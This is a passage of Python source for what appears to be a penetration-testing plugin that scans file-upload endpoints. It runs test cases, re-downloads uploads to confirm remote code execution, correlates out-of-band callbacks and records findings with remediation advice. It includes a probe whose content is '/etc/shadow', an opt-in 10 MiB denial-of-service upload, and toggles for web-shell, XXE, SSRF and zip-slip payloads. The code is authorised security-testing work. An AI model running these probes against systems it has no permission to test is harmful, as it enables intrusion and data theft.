        cases.append(UploadCase(
            name="symlink-fake", category="edge",
            filename="reqlore_link.txt",
            content=b"/etc/shadow",
            content_type="text/plain", severity_on_accept="info",
            description="Plain text containing what looks like a path "
                        "— probes implementations that follow on-disk "
                        "symlinks.",
        ))

    # --------------------------------------------------- DoS (opt-in)
    if settings.get("test_large_file", False):
        # 10 MiB of zeros, gzipped is tiny — but as raw upload it
        # exercises body-size limits. Operator must explicitly opt-in.
        big = b"\x00" * (10 * 1024 * 1024)
        cases.append(UploadCase(
            name="oversize-10MiB", category="dos",
            filename="reqlore_big.bin",
            content=big,
            content_type="application/octet-stream",
            severity_on_accept="info",
            description=("10 MiB upload to probe size limits. Off by "
                         "default."),
        ))

    return cases


# =============================================================================
# Detection helpers
# =============================================================================

@dataclass
class Baseline:
    status: int = 0
    body_len: int = 0
    location: str = ""
    body_signature: bytes = b""
    error: str = ""


def _looks_accepted(baseline: Baseline, resp: object) -> bool:
    """Return True iff ``resp`` looks like a successful upload relative
    to baseline. Conservative: status must be in the accepted set AND
    the body must not look like an error page (rough size heuristic)."""
    status = int(getattr(resp, "status", 0) or 0)
    if status == 0:
        return False
    if baseline.status and status != baseline.status:
        # Allow 200/201/204 to all count as success even if baseline
        # was a different 2xx.
        if not (200 <= status < 300 and 200 <= baseline.status < 300):
            return False
    body = bytes(getattr(resp, "body", b"") or b"")
    # If response is HUGE compared to baseline (e.g. 50x), probably an
    # error page. If baseline was empty, accept any 2xx.
    if baseline.body_len and len(body) > max(4096, baseline.body_len * 50):
        return False
    return True


def _extract_basename(filename: str) -> str:
    """Server-side basename most upload handlers use. Strips path
    components on both Unix and Windows separators and stops at the
    first NUL so we recover what the server probably stored as."""
    if not filename:
        return ""
    s = filename.split("\x00", 1)[0]
    for sep in ("/", "\\"):
        if sep in s:
            s = s.rsplit(sep, 1)[-1]
    return s


def _redownload_url(template: str, filename: str) -> str | None:
    """Format ``template`` with ``{basename}`` / ``{filename}`` slots.
    Returns ``None`` when the template is empty so the caller can skip
    the re-fetch step."""
    template = (template or "").strip()
    if not template:
        return None
    basename = _extract_basename(filename)
    try:
        return template.format(basename=basename, filename=basename)
    except Exception:
        # Operator typed an invalid template — fall back to a naive join.
        if template.endswith("/"):
            return template + basename
        return template + "/" + basename


# =============================================================================
# Seed-request derivation (Send-to-plugin)
# =============================================================================

# Request headers worth carrying over from a captured request. Cookie
# is handled separately into its own field. Content-* and hop-by-hop
# headers are excluded because the scanner sets them itself.
_SEED_HEADER_ALLOWLIST = frozenset({
    "authorization", "x-csrf", "x-csrf-token", "x-xsrf-token",
    "csrf-token", "x-requested-with", "x-api-key", "x-auth-token",
    "x-access-token", "origin", "referer", "user-agent", "accept",
    "accept-language",
})
_SEED_HEADER_BLOCKLIST = frozenset({
    "host", "connection", "content-length", "content-type",
    "transfer-encoding", "cookie",
})


def _parse_multipart_seed_body(
    content_type: str, body: bytes,
) -> tuple[str | None, list[tuple[str, str]]] | None:
    """Best-effort parse of a captured multipart/form-data body.

    Returns ``(file_field_name, [(name, text_value), ...])`` or
    ``None`` when the body isn't multipart or the boundary can't be
    located. Never raises; a malformed body just yields ``None`` or an
    empty extras list."""
    ct = (content_type or "").lower()
    if "multipart/form-data" not in ct:
        return None
    m = re.search(
        r'boundary=(?:"([^"]+)"|([^;,\s]+))', content_type or "",
        re.IGNORECASE,
    )
    if not m:
        return None
    boundary = (m.group(1) or m.group(2) or "").strip()
    if not boundary:
        return None
    delim = b"--" + boundary.encode("latin-1", "replace")
    if delim not in (body or b""):
        return None
    file_field: str | None = None
    extras: list[tuple[str, str]] = []
    for part in (body or b"").split(delim):
        part = part.strip(b"\r\n")
        if not part or part.startswith(b"--"):
            continue
        head, sep, payload = part.partition(b"\r\n\r\n")
        if not sep:
            continue
        try:
            head_str = head.decode("latin-1", "replace")
        except Exception:
            continue
        name: str | None = None
        is_file = False
        for hline in head_str.split("\r\n"):
            if hline.lower().startswith("content-disposition:"):
                nm = re.search(r'name="([^"]*)"', hline)
                if nm:
                    name = nm.group(1)
                if re.search(r'filename\s*=', hline, re.IGNORECASE):
                    is_file = True
                break
        if not name:
            continue
        if is_file:
            if file_field is None:
                file_field = name
            continue
        payload = payload.rstrip(b"\r\n")
        if len(payload) > 4096 or b"\x00" in payload:
            continue
        try:
            val = payload.decode("utf-8", "replace")
        except Exception:
            continue
        if "\n" in val or "\r" in val:
            continue
        extras.append((name, val))
    return (file_field, extras)


def _derive_headers_from_seed(seed) -> list[tuple[str, str]]:
    """Pick headers from a captured request that the upload scanner
    should reuse verbatim. Deduplicates by lower-cased name (first
    occurrence wins) and skips Content-* / hop-by-hop / Cookie."""
    out: list[tuple[str, str]] = []
    seen: set[str] = set()
    for k, v in (getattr(seed, "headers", None) or []):
        kl = (k or "").lower().strip()
        if not kl or kl in seen:
            continue
        seen.add(kl)
        if kl in _SEED_HEADER_BLOCKLIST:
            continue
        if kl in _SEED_HEADER_ALLOWLIST or kl.startswith("x-"):
            out.append((k, v))
    return out


def _apply_seed_overrides(settings: dict, seed, log_fn) -> dict:
    """Fill empty-or-default upload-scanner settings from a captured
    seed request. Operator-supplied values always win.

    Returns a new dict; never mutates ``settings``. Logs a single info
    line summarising every derived field so the operator can audit.
    ``log_fn`` failures are swallowed (logging must never crash a
    run)."""
    out = dict(settings or {})
    if seed is None:
        return out
    derived: list[str] = []

    # Cookie — only when the operator left the field blank.
    if not str(out.get("cookie") or "").strip():
        cookie = ""
        try:
            cookie = seed.header("Cookie")
        except Exception:
            cookie = ""
        if cookie:
            out["cookie"] = cookie
            derived.append("cookie")

    # Extra headers — only when the operator left the field blank.
    if not str(out.get("headers") or "").strip():
        hdrs = _derive_headers_from_seed(seed)
        if hdrs:
            out["headers"] = "\n".join(f"{k}: {v}" for k, v in hdrs)
            derived.append(f"headers({len(hdrs)})")

    # Multipart parts — file field name + sibling text fields.
    try:
        seed_ct = seed.header("Content-Type")
    except Exception:
        seed_ct = ""
    parsed = _parse_multipart_seed_body(seed_ct, getattr(seed, "body", b""))
    if parsed is not None:
        ff, extras = parsed
        cur_ff = str(out.get("file_field") or "").strip()
        if ff and cur_ff in ("", "file") and ff != cur_ff:
            out["file_field"] = ff
            derived.append(f"file_field={ff!r}")
        if extras and not str(out.get("extra_fields") or "").strip():
            out["extra_fields"] = "\n".join(
                f"{k}={v}" for k, v in extras
            )
            derived.append(f"extra_fields({len(extras)})")

    if derived and log_fn is not None:
        try:
            hid = int(getattr(seed, "history_id", 0) or 0)
            log_fn(
                f"seed#{hid}: derived " + ", ".join(derived),
                "info",
            )
        except Exception:
            pass
    return out


# =============================================================================
# Settings form
# =============================================================================

PLUGIN_APP = sdk.make_app(
    slug="file-upload-scanner",
    name="File Upload Scanner",
    description=(
        "Comprehensive upload-attack scanner with re-download oracle, "
        "OAST callbacks and RCE-marker verification. Covers every Burp "
        "UploadScanner family plus polyglots, ImageMagick, zip slip, "
        "PDF/SVG SSRF, CSV injection, EICAR, header-splitting and more."
    ),
    fields=[
        sdk.StrField(
            "url", required=True, label="Upload URL",
            placeholder="https://app.example.com/api/upload",
            help="Absolute URL of the upload endpoint.",
        ),
        sdk.SelectField(
            "method", choices=["POST", "PUT"], default="POST",
            label="HTTP method",
            help="POST sends multipart/form-data; PUT sends the file body raw.",
        ),
        sdk.StrField(
            "file_field", default="file",
            label="File form field name",
            help="Name attribute of the <input type=file> on the page.",
        ),
        sdk.TextField(
            "extra_fields", rows=4,
            label="Extra form fields",
            placeholder="csrf=abcdef\nkind=avatar",
            help="One key=value per line. Added to every multipart request.",
        ),
        sdk.TextField(
            "headers", rows=4,
            label="Extra request headers",
            placeholder="Authorization: Bearer xyz\nX-CSRF: ...",
            help="One header per line. Sent with every upload AND every "
                 "re-download.",
        ),
        sdk.StrField(
            "cookie", label="Cookie",
            placeholder="session=eyJ...; csrf=...",
            help="Sent as the Cookie header on every request.",
        ),
        sdk.StrField(
            "download_url_template",
            label="Re-download URL template",
            placeholder="https://app.example.com/uploads/{basename}",
            help=("If the server stores uploads under a predictable URL, "
                  "supply a template — the scanner will GET it after each "
                  "upload and confirm whether the file landed. Use "
                  "{basename} or {filename} as the slot."),
        ),
        sdk.IntField(
            "max_cases", default=200, min=1, max=5000,
            label="Maximum cases",
            help="Hard cap on test cases. Generated list is truncated.",
        ),
        sdk.IntField(
            "delay_ms", default=0, min=0, max=60000,
            label="Inter-request delay (ms)",
            help="Sleep between requests. Honoured during cancel.",
        ),
        sdk.IntField(
            "timeout_s", default=30, min=1, max=300,
            label="Per-request timeout (s)",
        ),
        sdk.IntField(
            "oast_settle_s", default=8, min=0, max=120,
            label="OAST poll wait (s)",
            help="After all cases finish, wait this many seconds for "
                 "delayed OAST callbacks before finalising.",
        ),
        sdk.BoolField(
            "use_oast", default=True,
            label="Use OAST callbacks",
            help="Embed unique OAST URLs in SVG/PDF/XML payloads and "
                 "correlate interactions back to cases.",
        ),
        sdk.BoolField(
            "verify_tls", default=False,
            label="Verify TLS certificates",
            help="Off by default — most pentest targets have invalid "
                 "certs.",
        ),
        sdk.BoolField("test_php", default=True, label="PHP shells"),
        sdk.BoolField("test_asp", default=True, label="ASP / ASPX shells"),
        sdk.BoolField("test_jsp", default=True, label="JSP shells"),
        sdk.BoolField("test_perl", default=True, label="Perl / CGI"),
        sdk.BoolField("test_python", default=False, label="Python (rare)"),
        sdk.BoolField("test_cf", default=False, label="ColdFusion (rare)"),
        sdk.BoolField("test_htaccess", default=True,
                      label=".htaccess / web.config / .user.ini"),
        sdk.BoolField("test_image_polyglot", default=True,
                      label="Image-PHP polyglots"),
        sdk.BoolField("test_svg", default=True,
                      label="SVG XSS / SSRF / XXE"),
        sdk.BoolField("test_xxe", default=True,
                      label="XML / DOCX XXE"),
        sdk.BoolField("test_pdf", default=True,
                      label="PDF /OpenAction SSRF"),
        sdk.BoolField("test_zip", default=True,
                      label="Zip slip / zip-php"),
        sdk.BoolField("test_imagick", default=True,
                      label="ImageMagick MVG/MSL/GhostScript"),
        sdk.BoolField("test_csv_injection", default=True,
                      label="CSV / formula injection"),
        sdk.BoolField("test_eicar", default=True,
                      label="EICAR antivirus probe"),
        sdk.BoolField("test_path_traversal", default=True,
                      label="Path-traversal filenames"),
        sdk.BoolField("test_shell_metachars", default=True,
                      label="Shell-metachar filenames"),
        sdk.BoolField("test_edge_cases", default=True,
                      label="Edge cases (empty, no-ext, mismatch)"),
        sdk.BoolField("test_large_file", default=False,
                      label="DoS: 10 MiB upload (opt-in)"),
        sdk.BoolField("honor_scope", default=True,
                      label="Honour project scope"),
    ],
    columns=["category", "case", "filename", "status",
             "size", "redownload", "oast", "verdict"],
    timeout_s=3 * 3600,
    tags=["upload", "rce", "ssrf", "xxe", "xss", "polyglot", "burp-parity"],
    category="active-scan",
)


# =============================================================================
# Runner
# =============================================================================

@PLUGIN_APP.runner
def _run(ctx: sdk.PluginContext) -> None:
    s = dict(ctx.settings)
    seed = getattr(ctx, "seed_request", None)
    if seed is not None:
        s = _apply_seed_overrides(s, seed, ctx.log)
    upload_url = (s.get("url") or "").strip()
    if not upload_url:
        ctx.log("settings.url is empty; cannot run", "error")
        return

    method = (s.get("method") or "POST").upper()
    file_field = (s.get("file_field") or "file").strip() or "file"
    download_tpl = (s.get("download_url_template") or "").strip()
    timeout_s = float(s.get("timeout_s", 30))
    verify_tls = bool(s.get("verify_tls", False))
    delay_ms = int(s.get("delay_ms", 0))
    use_oast = bool(s.get("use_oast", True))
    honor_scope = bool(s.get("honor_scope", True))

    # ---- Scope check ------------------------------------------------------
    if honor_scope and not ctx.scope.empty:
        if not ctx.scope.is_url_in_scope(upload_url):
            ctx.log(f"target {upload_url!r} is out of project scope; "
                    f"aborting (untoggle 'honor_scope' to override)",
                    "warning")
            return

    # ---- Parse extra form fields / headers -------------------------------
    def _kv_lines(blob: str) -> list[tuple[str, str]]:
        out: list[tuple[str, str]] = []
        for raw in (blob or "").splitlines():
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            sep = "=" if "=" in line and (
                ":" not in line or line.index("=") < line.index(":")
            ) else ":"
            if sep not in line:
                continue
            k, v = line.split(sep, 1)
            out.append((k.strip(), v.strip()))
        return out

    extra_fields = tuple(_kv_lines(s.get("extra_fields", "")))
    extra_headers = list(_kv_lines(s.get("headers", "")))
    cookie = (s.get("cookie") or "").strip()
    if cookie:
        extra_headers.append(("Cookie", cookie))

    # ---- Acquire OAST token ----------------------------------------------
    oast_token: str | None = None
    oast_base: str | None = None
    if use_oast:
        tok = ctx.oast_token()
        if tok is not None:
            oast_token, oast_base = tok
            ctx.log(f"OAST armed: {oast_base}", "info")
        else:
            ctx.log("OAST listener not running; OAST-based cases will "
                    "be skipped or downgraded", "warning")

    # ---- Build cases ------------------------------------------------------
    cases = build_cases(s, oast_token=oast_token, oast_base=oast_base)
    max_cases = int(s.get("max_cases", 200))
    if len(cases) > max_cases:
        ctx.log(f"truncating {len(cases)} cases to max_cases={max_cases}",
                "info")
        cases = cases[:max_cases]

    ctx.log(f"plan: {len(cases)} cases against {upload_url}", "info")
    ctx.progress(0, len(cases), "starting")

    # ---- Send one ---------------------------------------------------------
    def _send_one(case: UploadCase, *, override_filename: str | None = None):
        filename = override_filename or case.filename
        if method == "PUT":
            ct, body = _put_body(case.content, case.content_type)
            headers = list(extra_headers) + [("Content-Type", ct)]
            return ctx.send(
                "PUT", upload_url, headers=headers, body=body,
                timeout=timeout_s, verify=verify_tls,
            )
        merged_fields = tuple(list(extra_fields)
                              + list(case.extra_form_fields))
        ct, body = _build_multipart(
            file_field=file_field, filename=filename,
            file_content=case.content,
            file_content_type=case.content_type,
            extra_fields=merged_fields,
        )
        headers = list(extra_headers) + [("Content-Type", ct)]
        return ctx.send(
            method, upload_url, headers=headers, body=body,
            timeout=timeout_s, verify=verify_tls,
        )

    # ---- Baseline ---------------------------------------------------------
    baseline = Baseline()
    base_case = cases[0]
    bresp = _send_one(base_case)
    bstatus = int(getattr(bresp, "status", 0) or 0)
    bbody = bytes(getattr(bresp, "body", b"") or b"")
    bloc = ""
    for k, v in (getattr(bresp, "headers", []) or []):
        if k.lower() == "location":
            bloc = v
            break
    baseline = Baseline(
        status=bstatus, body_len=len(bbody), location=bloc,
        body_signature=bbody[:128],
        error=str(getattr(bresp, "error", "") or ""),
    )
    ctx.log(
        f"baseline: status={baseline.status} body_len={baseline.body_len}"
        f"{' error=' + baseline.error if baseline.error else ''}",
        "info",
    )
    if baseline.status == 0:
        ctx.log("baseline request failed — aborting before sending attack "
                "payloads", "error")
        ctx.add_result({
            "category": "baseline", "case": "baseline-png",
            "filename": base_case.filename, "status": "—",
            "size": "—", "redownload": "—", "oast": "—",
            "verdict": f"send-failed: {baseline.error or 'no response'}",
        })
        return

    ctx.add_result({
        "category": "baseline", "case": "baseline-png",
        "filename": base_case.filename, "status": baseline.status,
        "size": baseline.body_len, "redownload": "—", "oast": "—",
        "verdict": "ok",
    })
    ctx.progress(1, len(cases), "baseline ok")

    # ---- Track OAST tags -> case for post-run correlation ----------------
    tag_to_case: dict[str, UploadCase] = {}
    accepted_findings = 0
    oast_findings = 0
    server_errors = 0

    # ---- Walk cases -------------------------------------------------------
    for idx, case in enumerate(cases[1:], start=2):
        if ctx.stop_requested():
            ctx.log("stop requested — exiting case loop", "info")
            break
        try:
            resp = _send_one(case)
        except Exception as exc:                                  # noqa: BLE001
            ctx.log(f"{case.name}: send raised {exc!r}", "error")
            ctx.add_result({
                "category": case.category, "case": case.name,
                "filename": case.filename, "status": "ERR",
                "size": "—", "redownload": "—", "oast": "—",
                "verdict": f"send-error: {exc}",
            })
            ctx.progress(idx, len(cases), case.name)
            continue

        status = int(getattr(resp, "status", 0) or 0)
        body = bytes(getattr(resp, "body", b"") or b"")
        size = len(body)
        accepted = _looks_accepted(baseline, resp)

        # 5xx → parser crash signal.
        if 500 <= status < 600:
            server_errors += 1
            ctx.record_finding(
                title=f"Upload triggers {status}: {case.name}",
                severity="medium",
                host=urlparse(upload_url).hostname or "",
                url=upload_url,
                evidence=(body[:512].decode("latin-1", "replace")),
                payload=case.filename,
                description=(
                    f"Sending the {case.category} payload `{case.name}` "
                    f"caused the server to return HTTP {status}. This "
                    f"often indicates a server-side parser crash and "
                    f"warrants manual inspection of stack traces / logs."
                ),
                cwe="CWE-434",
                references=["https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"],
                confidence="firm",
            )

        # Re-download verification.
        rd_url = _redownload_url(download_tpl, case.filename)
        rd_status = ""
        rd_marker_hit = False
        rd_matches = False
        if accepted and rd_url:
            try:
                rd = ctx.send("GET", rd_url, headers=list(extra_headers),
                              timeout=timeout_s, verify=verify_tls)
                rd_status = int(getattr(rd, "status", 0) or 0)
                rd_body = bytes(getattr(rd, "body", b"") or b"")
                if rd_status and 200 <= rd_status < 300:
                    rd_matches = (rd_body == case.content
                                  or case.content[:64] in rd_body)
                    if case.rce_marker and case.rce_marker.encode() in rd_body:
                        rd_marker_hit = True
            except Exception as exc:                              # noqa: BLE001
                rd_status = f"err:{exc.__class__.__name__}"

        # Findings.
        verdict = "blocked"
        if accepted:
            verdict = "accepted"
            if rd_marker_hit:
                verdict = "RCE-confirmed"
            elif rd_matches:
                verdict = "stored"
            accepted_findings += 1

            sev = case.severity_on_accept
            title = f"Upload accepted: {case.name}"
            if rd_marker_hit:
                sev = "critical"
                title = f"Remote code execution via {case.name}"
            elif rd_matches and sev in ("low", "info"):
                sev = "medium"

            if case.category != "baseline":
                ctx.record_finding(
                    title=title, severity=sev,
                    host=urlparse(upload_url).hostname or "",
                    url=upload_url,
                    evidence=(
                        f"status={status} body_len={size} "
                        f"redownload={rd_status} "
                        f"matches={rd_matches} rce_marker={rd_marker_hit}"
                    ),
                    payload=case.filename,
                    description=case.description,
                    remediation=(
                        "Validate uploads by content (magic bytes + "
                        "renderer round-trip), reject server-side "
                        "executable extensions, store uploads outside "
                        "the webroot, serve them via a sandboxed "
                        "Content-Disposition: attachment endpoint and "
                        "enforce strict Content-Security-Policy on any "
                        "preview surface."
                    ),
                    cwe="CWE-434",
                    owasp="A04:2021 Insecure Design",
                    references=[
                        "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
                        "https://portswigger.net/web-security/file-upload",
                    ],
                    confidence="firm" if rd_marker_hit or rd_matches
                                else "tentative",
                )

        # Record + track.
        if case.oast_tag:
            tag_to_case[case.oast_tag] = case

        ctx.add_result({
            "category": case.category, "case": case.name,
            "filename": case.filename,
            "status": status,
            "size": size,
            "redownload": rd_status if rd_url else "—",
            "oast": "pending" if case.oast_tag else "—",
            "verdict": verdict,
        })
        ctx.progress(idx, len(cases), case.name)

        if delay_ms > 0:
            if not ctx.sleep(delay_ms / 1000.0):
                break

    # ---- Settle + collect OAST callbacks ---------------------------------
    if oast_token and not ctx.stop_requested():
        wait = int(s.get("oast_settle_s", 8))
        if wait > 0:
            ctx.log(f"waiting {wait}s for delayed OAST callbacks…", "info")
            ctx.sleep(wait)
        interactions = ctx.oast_interactions(oast_token) or []
        ctx.log(f"OAST: {len(interactions)} interaction(s) on token", "info")
        for ix in interactions:
            path = str(getattr(ix, "path", "") or "")
            # path looks like /<token>/<tag>/...
            segs = [seg for seg in path.split("/") if seg]
            tag = segs[1] if len(segs) >= 2 else ""
            case = tag_to_case.get(tag)
            if case is None:
                continue
            oast_findings += 1
            ctx.record_finding(
                title=f"OAST callback from upload: {case.name}",
                severity="high",
                host=urlparse(upload_url).hostname or "",
                url=upload_url,
                evidence=(
                    f"oast.kind={getattr(ix,'kind','http')} "
                    f"remote={getattr(ix,'remote','?')} "
                    f"path={path}"
                ),
                payload=case.filename,
                description=(
                    f"The {case.category} payload `{case.name}` produced "
                    f"an out-of-band callback to the OAST listener — "
                    f"the server (or a downstream renderer) parsed the "
                    f"upload and fetched the embedded URL. This is "
                    f"firm evidence of SSRF/XXE depending on the case."
                ),
                cwe="CWE-918" if "ssrf" in case.category else "CWE-611",
                owasp="A10:2021 SSRF",
                references=[
                    "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/",
                ],
                confidence="firm",
            )

    ctx.log(
        f"done: accepted_findings={accepted_findings} "
        f"oast_findings={oast_findings} server_errors={server_errors}",
        "info",
    )
